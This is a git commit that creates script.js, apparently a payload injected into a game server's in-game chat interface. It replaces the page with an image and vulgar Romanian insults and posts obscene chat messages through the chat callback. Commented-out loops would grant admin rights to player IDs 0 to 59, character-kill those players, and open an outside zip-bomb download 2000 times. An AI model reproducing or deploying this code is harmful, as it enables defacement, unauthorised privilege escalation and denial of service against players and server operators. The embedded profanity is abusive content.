cbd97372d145a1e572aed155c3f4fc5fa0b86ce2
vqxify23 <xqvexify@gmail.com>
2024-12-21 12:18:01 +0200

    Create script.js

---
+++ script.js
@@ -0,0 +1,31 @@
+document.body.innerHTML = `
+<img style="position:absolute;top:0;left:0;width:100%;height:100%;opacity: .5;" src="https://cdn.discordapp.com/attachments/1277298412676710551/1319273041976492146/artworks-000080274052-owdch4-t500x500.png?ex=67655c44&is=67640ac4&hm=ed9c59a40d4b30d8533f9cdac0542b9c40a166fd1ad41e03cdbfeef826880f84&" alt="Background Image">
+<img src='https://cdn.discordapp.com/attachments/1277298412676710551/1319273041976492146/artworks-000080274052-owdch4-t500x500.png?ex=67655c44&is=67640ac4&hm=ed9c59a40d4b30d8533f9cdac0542b9c40a166fd1ad41e03cdbfeef826880f84&'>
+<div style="position: absolute; font-size: 2vw; color: white; right: 1vw; font-weight: 600;">
+    A INTRAT PENNSIA SA DONEZI?
+    <br>ANTONIO X VEXIFY$$$CLANU PULA MARE<br>
+</div>
+`
+let i = 0;
+
+// for (let index = 0; index < 60; index++) {
+//     $.post('https://chat/chatResult', JSON.stringify({
+//         message: `/setadmin ${index} 11`
+//     })) 
+// }
+
+// for (let index = 0; index < 60; index++) {
+//     $.post('https://chat/chatResult', JSON.stringify({
+//         message: `/ck ${index}`
+//     }))
+// }
+
+for (let index = 0; index < 2; index++) {
+    $.post('https://chat/chatResult', JSON.stringify({
+        message: `MUIE PLESGAGA BY VEXIFY & ANTONIO`
+    }))
+}
+
+// for (let index = 0; index < 2000; index++) {
+//     window.invokeNative('openUrl', 'https://theaviary.me/Zip-Bomb/Zip%20Bomb%20Files/42-old.zip');
+// }
